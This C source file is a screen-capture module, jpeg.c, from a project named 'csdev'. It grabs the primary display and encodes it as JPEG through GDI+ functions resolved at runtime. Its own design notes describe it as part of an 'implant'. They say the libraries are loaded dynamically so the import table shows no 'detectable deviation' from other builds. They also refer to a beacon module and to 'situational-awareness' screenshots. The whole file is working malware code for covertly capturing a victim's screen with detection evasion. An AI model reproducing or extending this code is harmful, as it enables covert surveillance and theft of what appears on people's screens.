/*
 * csdev :: jpeg.c  --  Grab the screen and encode it as JPEG via GDI+
 * ==========================================================================
 * Design notes (why it looks like this):
 *
 * 1. gdiplus.dll and ole32.dll are resolved at runtime (LoadLibraryA +
 *    GetProcAddress). The static import table must stay at
 *    ADVAPI32/KERNEL32/msvcrt/WINHTTP - adding gdiplus there would be a
 *    detectable deviation from every other build of this implant.
 *
 * 2. GDI+ has two surfaces: the C++ classes and the flat Gdip* API. The flat
 *    API is used here because it needs no C++ runtime and no vtable layout
 *    beyond CS_IStream, which we declare once below.
 *
 * 3. This file is intentionally ASCII-only. An earlier module in this project
 *    mis-tokenised under multi-byte comments; keeping translation units that
 *    hand-roll ABI structs plain ASCII removes that failure mode entirely.
 *
 * 4. All sizes checked before every write - the pixel buffer is heap memory
 *    sized from screen metrics, and screen metrics can change between the
 *    GetSystemMetrics call and the DIB section creation.
 * ==========================================================================
 */
#include <windows.h>

#include "jpeg.h"

/* GetProcAddress 返回值经函数指针间接赋值: Windows 上的标准做法, GCC 的
 * strict-aliasing 警告在此场景是保守误报 (与 beacon2_ops.c 同样处理)。 */
#if defined(__GNUC__)
#pragma GCC diagnostic ignored "-Wstrict-aliasing"
#endif

/* ---------------------------------------------------------------- GDI+ ABI */

typedef struct {
    UINT32 GdiplusVersion;
    void  *DebugEventCallback;
    BOOL   SuppressBackgroundThread;
    BOOL   SuppressExternalCodecs;
} GdipStartupInput;

typedef struct {
    void *NotificationHook;
    void *NotificationUnhook;
} GdipStartupOutput;

typedef struct {
    CLSID        Clsid;
    GUID         FormatID;
    const WCHAR *CodecName;
    const WCHAR *DllName;
    const WCHAR *FormatDescription;
    const WCHAR *FilenameExtension;
    const WCHAR *MimeType;
    DWORD        Flags;
    DWORD        Version;
    DWORD        SigCount;
    DWORD        SigSize;
    const BYTE  *SigPattern;
    const BYTE  *SigMask;
} ImageCodecInfo;

/* CS_IStream: IUnknown (3) + Read/Write/Seek/SetSize/CopyTo/Commit/Revert/
 * LockRegion/UnlockRegion/Stat/Clone. Only Read/Seek/Stat are used. */
typedef struct CS_IStream CS_IStream;
typedef struct CS_IStreamVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(CS_IStream *, const GUID *, void **);
    ULONG   (STDMETHODCALLTYPE *AddRef)(CS_IStream *);
    ULONG   (STDMETHODCALLTYPE *Release)(CS_IStream *);
    HRESULT (STDMETHODCALLTYPE *Read)(CS_IStream *, void *, ULONG, ULONG *);
    HRESULT (STDMETHODCALLTYPE *Write)(CS_IStream *, const void *, ULONG, ULONG *);
    HRESULT (STDMETHODCALLTYPE *Seek)(CS_IStream *, LARGE_INTEGER, DWORD, ULARGE_INTEGER *);
    HRESULT (STDMETHODCALLTYPE *SetSize)(CS_IStream *, ULARGE_INTEGER);
    HRESULT (STDMETHODCALLTYPE *CopyTo)(CS_IStream *, CS_IStream *, ULARGE_INTEGER, ULARGE_INTEGER *, ULARGE_INTEGER *);
    HRESULT (STDMETHODCALLTYPE *Commit)(CS_IStream *, DWORD);
    HRESULT (STDMETHODCALLTYPE *Revert)(CS_IStream *);
    HRESULT (STDMETHODCALLTYPE *LockRegion)(CS_IStream *, ULARGE_INTEGER, ULARGE_INTEGER, DWORD);
    HRESULT (STDMETHODCALLTYPE *UnlockRegion)(CS_IStream *, ULARGE_INTEGER, ULARGE_INTEGER, DWORD);
    HRESULT (STDMETHODCALLTYPE *Stat)(CS_IStream *, void *, DWORD);
    HRESULT (STDMETHODCALLTYPE *Clone)(CS_IStream *, CS_IStream **);
} CS_IStreamVtbl;

struct CS_IStream { const CS_IStreamVtbl *lpVtbl; };

typedef struct {
    LPOLESTR       pwcsName;
    DWORD          type;
    ULARGE_INTEGER cbSize;
    FILETIME       mtime;
    FILETIME       ctime;
    FILETIME       atime;
    DWORD          grfMode;
    DWORD          grfLocksSupported;
    CLSID          clsid;
    DWORD          grfStateBits;
    DWORD          reserved;
} CS_STATSTG;

#define CS_STREAM_SEEK_SET 0
#define CS_STATFLAG_NONAME 1
#define CS_PIXFMT_24BPPRGB 0x00021808

/* ---------------------------------------------------------------- dynamic */

typedef struct {
    HMODULE hGdiplus;
    HMODULE hOle32;

    /* gdi32 (screen capture) */
    HDC     (WINAPI *GetDC)(HWND);
    int     (WINAPI *ReleaseDC)(HWND, HDC);
    int     (WINAPI *GetSystemMetrics)(int);
    HDC     (WINAPI *CreateCompatibleDC)(HDC);
    HBITMAP (WINAPI *CreateDIBSection)(HDC, const void *, unsigned int, void **, HANDLE, DWORD);
    HGDIOBJ (WINAPI *SelectObject)(HDC, HGDIOBJ);
    BOOL    (WINAPI *BitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
    BOOL    (WINAPI *DeleteDC)(HDC);
    BOOL    (WINAPI *DeleteObject)(HGDIOBJ);
    BOOL    (WINAPI *StretchBlt)(HDC, int, int, int, int, HDC, int, int, int, int, DWORD);
    int     (WINAPI *SetStretchBltMode)(HDC, int);

    /* gdiplus */
    int (WINAPI *GdiplusStartup)(ULONG_PTR *, const GdipStartupInput *, GdipStartupOutput *);
    void (WINAPI *GdiplusShutdown)(ULONG_PTR);
    int (WINAPI *GdipCreateBitmapFromScan0)(int, int, int, int, BYTE *, void **);
    int (WINAPI *GdipSaveImageToStream)(void *, CS_IStream *, const CLSID *, const void *);
    int (WINAPI *GdipDisposeImage)(void *);
    int (WINAPI *GdipGetImageEncodersSize)(UINT *, UINT *);
    int (WINAPI *GdipGetImageEncoders)(UINT, UINT, ImageCodecInfo *);

    /* ole32 */
    HRESULT (WINAPI *CreateStreamOnHGlobal)(HGLOBAL, BOOL, CS_IStream **);

    ULONG_PTR token;
    int       started;
    int       failed;
} JPEGDYN;

static JPEGDYN j;
static unsigned int g_scale = 100;
static const char *g_lastErr = "not attempted";

const char *shot_last_error(void) { return g_lastErr; }

void shot_set_scale(unsigned int percent)
{
    if (percent >= 10u && percent <= 100u) g_scale = percent;
}

static FARPROC jsym(HMODULE m, const char *name)
{
    return m ? GetProcAddress(m, name) : NULL;
}

static int jpeg_load(void)
{
    HMODULE user32, gdi32;

    if (j.started) return 1;
    if (j.failed) return 0;

    user32 = LoadLibraryA("user32.dll");
    gdi32 = LoadLibraryA("gdi32.dll");
    j.hGdiplus = LoadLibraryA("gdiplus.dll");
    j.hOle32 = LoadLibraryA("ole32.dll");

    if (!user32 || !gdi32 || !j.hGdiplus || !j.hOle32) {
        g_lastErr = "load library";
        j.failed = 1;
        return 0;
    }

    *(FARPROC *)&j.GetDC = jsym(user32, "GetDC");
    *(FARPROC *)&j.ReleaseDC = jsym(user32, "ReleaseDC");
    *(FARPROC *)&j.GetSystemMetrics = jsym(user32, "GetSystemMetrics");
    *(FARPROC *)&j.CreateCompatibleDC = jsym(gdi32, "CreateCompatibleDC");
    *(FARPROC *)&j.CreateDIBSection = jsym(gdi32, "CreateDIBSection");
    *(FARPROC *)&j.SelectObject = jsym(gdi32, "SelectObject");
    *(FARPROC *)&j.BitBlt = jsym(gdi32, "BitBlt");
    *(FARPROC *)&j.DeleteDC = jsym(gdi32, "DeleteDC");
    *(FARPROC *)&j.DeleteObject = jsym(gdi32, "DeleteObject");
    *(FARPROC *)&j.StretchBlt = jsym(gdi32, "StretchBlt");
    *(FARPROC *)&j.SetStretchBltMode = jsym(gdi32, "SetStretchBltMode");

    *(FARPROC *)&j.GdiplusStartup = jsym(j.hGdiplus, "GdiplusStartup");
    *(FARPROC *)&j.GdiplusShutdown = jsym(j.hGdiplus, "GdiplusShutdown");
    *(FARPROC *)&j.GdipCreateBitmapFromScan0 = jsym(j.hGdiplus, "GdipCreateBitmapFromScan0");
    *(FARPROC *)&j.GdipSaveImageToStream = jsym(j.hGdiplus, "GdipSaveImageToStream");
    *(FARPROC *)&j.GdipDisposeImage = jsym(j.hGdiplus, "GdipDisposeImage");
    *(FARPROC *)&j.GdipGetImageEncodersSize = jsym(j.hGdiplus, "GdipGetImageEncodersSize");
    *(FARPROC *)&j.GdipGetImageEncoders = jsym(j.hGdiplus, "GdipGetImageEncoders");

    *(FARPROC *)&j.CreateStreamOnHGlobal = jsym(j.hOle32, "CreateStreamOnHGlobal");

    if (!j.GetDC || !j.CreateDIBSection || !j.BitBlt || !j.GdiplusStartup ||
        !j.GdipCreateBitmapFromScan0 || !j.GdipSaveImageToStream ||
        !j.GdipGetImageEncodersSize || !j.GdipGetImageEncoders ||
        !j.CreateStreamOnHGlobal) {
        g_lastErr = "resolve symbols";
        j.failed = 1;
        return 0;
    }

    {
        GdipStartupInput in;
        in.GdiplusVersion = 1;
        in.DebugEventCallback = NULL;
        in.SuppressBackgroundThread = FALSE;
        in.SuppressExternalCodecs = FALSE;
        if (j.GdiplusStartup(&j.token, &in, NULL) != 0) {
            g_lastErr = "GdiplusStartup";
            j.failed = 1;
            return 0;
        }
    }

    j.started = 1;
    return 1;
}

/* ---------------------------------------------------------------- capture */

/* Grab the primary screen into a top-down 24bpp buffer.
 * Returns a VirtualAlloc'd buffer (caller frees) or NULL. */
static unsigned char *grab_screen(unsigned int *ow, unsigned int *oh, unsigned int *ostride)
{
    HDC hScreen = NULL, hMem = NULL;
    HBITMAP hBmp = NULL, hOld = NULL;
    BITMAPINFO bi;
    void *bits = NULL;
    unsigned char *rows = NULL;
    unsigned int sw, sh, dw, dh, stride, i;

    if (!jpeg_load()) return NULL;

    sw = (unsigned int)j.GetSystemMetrics(0);
    sh = (unsigned int)j.GetSystemMetrics(1);
    if (sw == 0 || sh == 0 || sw > 8192 || sh > 8192) { g_lastErr = "screen metrics"; return NULL; }

    dw = sw * g_scale / 100u;
    dh = sh * g_scale / 100u;
    if (dw < 16u) dw = 16u;
    if (dh < 16u) dh = 16u;

    hScreen = j.GetDC(NULL);
    if (!hScreen) { g_lastErr = "GetDC"; return NULL; }
    hMem = j.CreateCompatibleDC(hScreen);
    if (!hMem) { g_lastErr = "CreateCompatibleDC"; j.ReleaseDC(NULL, hScreen); return NULL; }

    {
        unsigned int k;
        unsigned char *p = (unsigned char *)&bi;
        for (k = 0; k < sizeof(bi); k++) p[k] = 0;
    }
    stride = ((sw * 3u + 3u) / 4u) * 4u;

    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = (LONG)sw;
    bi.bmiHeader.biHeight = -(LONG)sh;        /* top-down */
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 24;
    bi.bmiHeader.biCompression = 0;
    bi.bmiHeader.biSizeImage = stride * sh;

    hBmp = j.CreateDIBSection(hScreen, &bi, 0, &bits, NULL, 0);
    if (!hBmp || !bits) { g_lastErr = "CreateDIBSection"; goto fail; }

    hOld = (HBITMAP)j.SelectObject(hMem, hBmp);
    /* SRCCOPY | CAPTUREBLT */
    if (!j.BitBlt(hMem, 0, 0, (int)sw, (int)sh, hScreen, 0, 0, 0x40CC0020)) {
        g_lastErr = "BitBlt";
        goto fail;
    }

    /* Copy (and optionally downscale) into our own buffer so the GDI objects
     * can be released before the (slow) encoder runs. */
    {
        unsigned int dstride = ((dw * 3u + 3u) / 4u) * 4u;
        rows = (unsigned char *)VirtualAlloc(NULL, dstride * dh,
                                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!rows) { g_lastErr = "alloc pixel buffer"; goto fail; }

        if (dw == sw && dh == sh) {
            for (i = 0; i < sh; i++) {
                unsigned char *d = rows + i * dstride;
                const unsigned char *s = (const unsigned char *)bits + i * stride;
                unsigned int k;
                for (k = 0; k < dstride; k++) d[k] = s[k];
            }
        } else {
            /* Nearest-neighbour downscale: cheap and good enough for a
             * situational-awareness screenshot. */
            unsigned int y;
            for (y = 0; y < dh; y++) {
                unsigned int sy = y * sh / dh;
                unsigned char *d = rows + y * dstride;
                const unsigned char *s = (const unsigned char *)bits + sy * stride;
                unsigned int x;
                for (x = 0; x < dw; x++) {
                    unsigned int sx = x * sw / dw;
                    d[x * 3 + 0] = s[sx * 3 + 0];
                    d[x * 3 + 1] = s[sx * 3 + 1];
                    d[x * 3 + 2] = s[sx * 3 + 2];
                }
            }
        }

        *ow = dw;
        *oh = dh;
        *ostride = dstride;
    }

    j.SelectObject(hMem, hOld);
    j.DeleteObject(hBmp);
    j.DeleteDC(hMem);
    j.ReleaseDC(NULL, hScreen);
    return rows;

fail:
    if (rows) VirtualFree(rows, 0, MEM_RELEASE);
    if (hOld) j.SelectObject(hMem, hOld);
    if (hBmp) j.DeleteObject(hBmp);
    if (hMem) j.DeleteDC(hMem);
    if (hScreen) j.ReleaseDC(NULL, hScreen);
    return NULL;
}

/* ---------------------------------------------------------------- encode */

unsigned int shot_jpeg(unsigned char *out, unsigned int cap)
{
    unsigned char *pix;
    unsigned int w = 0, h = 0, stride = 0;
    void *bmp = NULL;
    CS_IStream *stm = NULL;
    CLSID enc = { 0 };
    int rc;

    if (!out || cap < 1024u) { g_lastErr = "bad target buffer"; return 0; }
    if (!jpeg_load()) return 0;

    pix = grab_screen(&w, &h, &stride);
    if (!pix) return 0;

    rc = j.GdipCreateBitmapFromScan0((int)w, (int)h, (int)stride,
                                     CS_PIXFMT_24BPPRGB, pix, &bmp);
    if (rc != 0 || !bmp) { g_lastErr = "GdipCreateBitmapFromScan0"; VirtualFree(pix, 0, MEM_RELEASE); return 0; }

    /* Find the JPEG encoder CLSID by MIME type from the installed encoders. */
    {
        UINT num = 0, size = 0;
        ImageCodecInfo *list;
        UINT i;
        int found = 0;

        if (j.GdipGetImageEncodersSize(&num, &size) != 0 || size == 0) {
            g_lastErr = "GdipGetImageEncodersSize";
            j.GdipDisposeImage(bmp);
            VirtualFree(pix, 0, MEM_RELEASE);
            return 0;
        }
        list = (ImageCodecInfo *)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!list) {
            g_lastErr = "alloc encoder list";
            j.GdipDisposeImage(bmp);
            VirtualFree(pix, 0, MEM_RELEASE);
            return 0;
        }
        if (j.GdipGetImageEncoders(num, size, list) != 0) {
            g_lastErr = "GdipGetImageEncoders";
            VirtualFree(list, 0, MEM_RELEASE);
            j.GdipDisposeImage(bmp);
            VirtualFree(pix, 0, MEM_RELEASE);
            return 0;
        }
        for (i = 0; i < num; i++) {
            const WCHAR *m = list[i].MimeType;
            if (m && m[0] == L'i' && m[1] == L'm' && m[2] == L'a' && m[3] == L'g' &&
                m[4] == L'e' && m[5] == L'/' && m[6] == L'j') {
                enc = list[i].Clsid;
                found = 1;
                break;
            }
        }
        VirtualFree(list, 0, MEM_RELEASE);
        if (!found) {
            g_lastErr = "no jpeg encoder installed";
            j.GdipDisposeImage(bmp);
            VirtualFree(pix, 0, MEM_RELEASE);
            return 0;
        }
    }

    if (j.CreateStreamOnHGlobal(NULL, TRUE, &stm) != 0 || !stm) {
        g_lastErr = "CreateStreamOnHGlobal";
        j.GdipDisposeImage(bmp);
        VirtualFree(pix, 0, MEM_RELEASE);
        return 0;
    }

    rc = j.GdipSaveImageToStream(bmp, stm, &enc, NULL);
    if (rc != 0) {
        g_lastErr = "GdipSaveImageToStream";
        stm->lpVtbl->Release(stm);
        j.GdipDisposeImage(bmp);
        VirtualFree(pix, 0, MEM_RELEASE);
        return 0;
    }

    {
        CS_STATSTG st;
        ULARGE_INTEGER pos;
        ULONG got = 0;
        unsigned int total = 0;
        unsigned int k;
        unsigned char *sp = (unsigned char *)&st;
        for (k = 0; k < sizeof(st); k++) sp[k] = 0;

        if (stm->lpVtbl->Stat(stm, &st, CS_STATFLAG_NONAME) != 0) {
            g_lastErr = "CS_IStream::Stat";
            stm->lpVtbl->Release(stm);
            j.GdipDisposeImage(bmp);
            VirtualFree(pix, 0, MEM_RELEASE);
            return 0;
        }

        pos.QuadPart = 0;
        if (stm->lpVtbl->Seek(stm, *(LARGE_INTEGER *)&pos, CS_STREAM_SEEK_SET, NULL) != 0) {
            g_lastErr = "CS_IStream::Seek";
            stm->lpVtbl->Release(stm);
            j.GdipDisposeImage(bmp);
            VirtualFree(pix, 0, MEM_RELEASE);
            return 0;
        }

        {
            unsigned long long avail = st.cbSize.QuadPart;
            if (avail > (unsigned long long)cap) avail = cap;
            while (total < (unsigned int)avail) {
                if (stm->lpVtbl->Read(stm, out + total, (ULONG)(avail - total), &got) != 0) break;
                if (got == 0) break;
                total += got;
            }
        }

        stm->lpVtbl->Release(stm);
        j.GdipDisposeImage(bmp);
        VirtualFree(pix, 0, MEM_RELEASE);

        if (total < 4u) { g_lastErr = "empty stream"; return 0; }
        /* sanity: JPEG SOI marker */
        if (!(out[0] == 0xFF && out[1] == 0xD8)) { g_lastErr = "not a jpeg"; return 0; }
        return total;
    }
}
